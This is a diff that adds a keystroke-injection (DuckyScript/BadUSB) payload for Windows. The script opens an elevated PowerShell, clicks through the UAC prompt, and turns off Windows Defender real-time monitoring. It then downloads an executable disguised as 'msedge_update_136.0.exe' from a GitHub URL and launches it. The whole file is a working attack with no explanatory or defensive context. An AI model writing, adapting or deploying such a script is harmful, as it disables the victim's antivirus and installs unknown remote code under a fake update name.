@@ -1,0 +1,43 @@
+WINDOWS r
+DELAY 430
+STRING powershell
+ENTER
+DELAY 830
+STRING Start-Process powershell -Verb RunAs
+ENTER
+DELAY 710
+LEFTARROW
+ENTER
+DELAY 1093
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 729
+STRING exit
+ENTER
+DELAY 580
+STRING exit
+ENTER
+DELAY 290
+WINDOWS r
+DELAY 115
+STRING msedge.exe
+ENTER
+DELAY 901
+STRING https://github.com/biskit-git/testing/raw/refs/heads/main/msedge_update_136.0.exe
+ENTER 
+DELAY 386
+ALT F4
+DELAY 190
+WINDOWS r
+DELAY 290
+STRING powershell
+ENTER
+DELAY 580
+STRING cd Downloads
+ENTER
+DELAY 448
+STRING start msedge_update_136.0.exe
+ENTER
+DELAY 200
+STRING exit
+ENTER
